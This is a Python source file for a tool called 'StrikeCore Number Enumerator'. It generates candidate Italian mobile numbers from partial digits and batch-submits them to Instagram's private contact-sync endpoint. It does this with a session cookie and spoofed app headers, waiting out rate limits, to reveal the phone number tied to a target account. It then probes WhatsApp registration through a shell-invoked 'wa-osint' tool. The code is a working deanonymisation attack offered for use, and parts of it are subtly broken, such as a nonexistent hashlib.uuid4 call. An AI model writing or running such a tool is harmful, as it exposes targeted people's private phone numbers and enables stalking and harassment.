#!/usr/bin/env python3
"""
StrikeCore Number Enumerator — Reverse lookup via IG Contact Sync + WA check.

Given partial phone digits and a target IG account ID, enumerate candidate
numbers and verify them against Instagram's contact sync API to find which
number is linked to the target account.
"""

import hashlib
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from itertools import product

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Italian mobile prefixes (3-digit after +39)
IT_MOBILE_PREFIXES = [
    # TIM
    "330", "331", "333", "334", "335", "336", "337", "338", "339",
    "360", "361", "362", "363", "366", "368",
    # Vodafone
    "340", "341", "342", "343", "344", "345", "346", "347", "348", "349",
    # Wind Tre
    "320", "322", "323", "324", "327", "328", "329",
    "380", "383", "388", "389", "390", "391", "392", "393",
    # Iliad
    "351", "370", "371", "377", "378",
    # Poste Mobile / MVNO
    "350", "352",
    # Fastweb
    "373", "375",
    # Others
    "353", "355", "356", "357",
]


@dataclass
class EnumerationResult:
    """Result of number enumeration."""
    target_ig_id: str
    target_ig_username: str
    candidates_tested: int = 0
    match_found: bool = False
    matched_number: str = ""
    matched_via: str = ""  # "ig_contact_sync" or "whatsapp"
    wa_registered: list = field(default_factory=list)


class NumberEnumerator:
    """Generate and verify candidate phone numbers."""

    def __init__(self, target_ig_id, target_ig_username, ig_session_id=None):
        self.target_ig_id = str(target_ig_id)
        self.target_ig_username = target_ig_username
        self.ig_session_id = ig_session_id or os.environ.get("IG_SESSION_ID", "")
        self.result = EnumerationResult(
            target_ig_id=self.target_ig_id,
            target_ig_username=self.target_ig_username,
        )

    def generate_candidates(self, known_digits=None, prefix_filter=None, max_candidates=10000):
        """Generate candidate numbers based on known partial digits.
        
        Args:
            known_digits: dict of position -> digit (0-9 for 10-digit Italian mobile)
            prefix_filter: list of 3-digit prefixes to try (default: all Italian mobile)
            max_candidates: maximum candidates to generate
        """
        known = known_digits or {}
        prefixes = prefix_filter or IT_MOBILE_PREFIXES
        
        candidates = []
        
        # If we know the first 3 digits (prefix), only use that prefix
        if all(i in known for i in range(3)):
            prefix = known[0] + known[1] + known[2]
            prefixes = [prefix]
        
        for prefix in prefixes:
            # Build the 10-digit number: prefix (3) + remaining (7)
            # Override prefix with known digits if available
            base = list(prefix)
            for i in range(3):
                if i in known:
                    base[i] = known[i]
            
            # If prefix doesn't match known digits, skip
            skip = False
            for i in range(3):
                if i in known and base[i] != known[i]:
                    skip = True
                    break
            if skip:
                continue
            
            # Generate remaining 7 digits
            unknown_positions = [i for i in range(3, 10) if i not in known]
            
            if len(unknown_positions) > 5:
                # Too many unknowns — skip this prefix unless we have good constraints
                continue
            
            if len(unknown_positions) == 0:
                # Full number known
                number = "+39" + "".join(known.get(i, "0") for i in range(10))
                candidates.append(number)
                continue
            
            # Generate all combinations for unknown positions
            for combo in product("0123456789", repeat=len(unknown_positions)):
                if len(candidates) >= max_candidates:
                    break
                
                digits = list(base) + ["0"] * 7
                for i in range(3, 10):
                    if i in known:
                        digits[i] = known[i]
                
                for pos, digit in zip(unknown_positions, combo):
                    digits[pos] = digit
                
                number = "+39" + "".join(digits)
                candidates.append(number)
            
            if len(candidates) >= max_candidates:
                break
        
        return candidates

    def check_ig_contact_sync(self, numbers, batch_size=50):
        """Check numbers against Instagram contact sync API.
        
        This API accepts phone numbers and returns linked IG accounts.
        Requires a valid IG session cookie.
        """
        if not self.ig_session_id:
            print("    [!] No IG session ID — cannot use contact sync")
            print("    [!] Set IG_SESSION_ID env var or pass ig_session_id to constructor")
            return []
        
        matches = []
        total = len(numbers)
        
        for i in range(0, total, batch_size):
            batch = numbers[i:i+batch_size]
            
            # Format contacts for the API
            contacts = []
            for j, num in enumerate(batch):
                contacts.append({
                    "phone_numbers": [num.replace("+", "")],
                    "first_name": f"Contact{i+j}",
                    "last_name": "",
                })
            
            try:
                data = json.dumps({"contacts": contacts}).encode()
                req = urllib.request.Request(
                    "https://i.instagram.com/api/v1/address_book/link/",
                    data=urllib.parse.urlencode({
                        "contacts": json.dumps(contacts),
                        "phone_id": hashlib.uuid4().hex if hasattr(hashlib, 'uuid4') else "a1b2c3d4",
                    }).encode(),
                    headers={
                        "User-Agent": "Instagram 275.0.0.27.98 Android",
                        "Cookie": f"sessionid={self.ig_session_id}",
                        "X-IG-App-ID": "936619743392459",
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                )
                
                with urllib.request.urlopen(req, timeout=15) as resp:
                    result = json.loads(resp.read())
                    
                    users = result.get("users", [])
                    for user in users:
                        uid = str(user.get("pk", ""))
                        uname = user.get("username", "")
                        
                        if uid == self.target_ig_id or uname == self.target_ig_username:
                            # MATCH! Find which number
                            # The API usually returns the number in the response
                            phone = user.get("phone_number", "")
                            if not phone:
                                # Try to correlate from batch
                                phone = batch[0] if len(batch) == 1 else "unknown (batch)"
                            
                            matches.append({
                                "number": phone,
                                "ig_id": uid,
                                "ig_username": uname,
                                "batch_range": f"{batch[0]}...{batch[-1]}",
                            })
                            print(f"    *** MATCH: {phone} -> @{uname} (ID:{uid}) ***")
                            self.result.match_found = True
                            self.result.matched_number = phone
                            self.result.matched_via = "ig_contact_sync"
                            return matches
                
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(f"    Rate limited at batch {i//batch_size}. Waiting 60s...")
                    time.sleep(60)
                elif e.code in (401, 403):
                    print(f"    Session expired or invalid")
                    return matches
                else:
                    pass
            except Exception as e:
                pass
            
            self.result.candidates_tested += len(batch)
            
            if (i // batch_size) % 10 == 0 and i > 0:
                print(f"    Checked {self.result.candidates_tested}/{total}...")
            
            time.sleep(2)  # Rate limiting
        
        return matches

    def check_whatsapp(self, numbers):
        """Check if numbers are registered on WhatsApp.
        
        Uses the wa-osint tool or direct API probing.
        Returns list of registered numbers.
        """
        registered = []
        
        for num in numbers[:50]:  # Limit to avoid abuse
            clean = num.replace("+", "")
            # Method 1: Check wa.me profile
            try:
                req = urllib.request.Request(
                    f"https://api.whatsapp.com/send/?phone={clean}",
                    headers={"User-Agent": "Mozilla/5.0"},
                    method="HEAD",
                )
                with urllib.request.urlopen(req, timeout=8) as resp:
                    # If the page loads with a valid profile, number exists
                    # Unfortunately wa.me always returns 200
                    pass
            except:
                pass
            
            # Method 2: Use wa-osint if available
            raw = subprocess.run(
                f"wa-osint {num} 2>/dev/null | head -5",
                shell=True, capture_output=True, text=True, timeout=10,
            ).stdout.strip() if os.path.exists("/usr/local/bin/wa-osint") or \
                subprocess.run("which wa-osint", shell=True, capture_output=True).returncode == 0 else ""
            
            if raw and ("registered" in raw.lower() or "exists" in raw.lower()):
                registered.append(num)
                self.result.wa_registered.append(num)
                print(f"    [WA] {num}: REGISTERED")
            
            time.sleep(1)
        
        return registered

    def report(self):
        """Print enumeration report."""
        print(f"\n{'='*60}")
        print(f"  NUMBER ENUMERATION REPORT")
        print(f"{'='*60}")
        print(f"  Target: @{self.target_ig_username} (ID: {self.target_ig_id})")
        print(f"  Candidates tested: {self.result.candidates_tested}")
        
        if self.result.match_found:
            print(f"\n  *** MATCH FOUND ***")
            print(f"  Number: {self.result.matched_number}")
            print(f"  Via: {self.result.matched_via}")
        else:
            print(f"\n  No match found via contact sync")
        
        if self.result.wa_registered:
            print(f"\n  WhatsApp registered ({len(self.result.wa_registered)}):")
            for n in self.result.wa_registered:
                print(f"    {n}")
        
        print(f"{'='*60}")
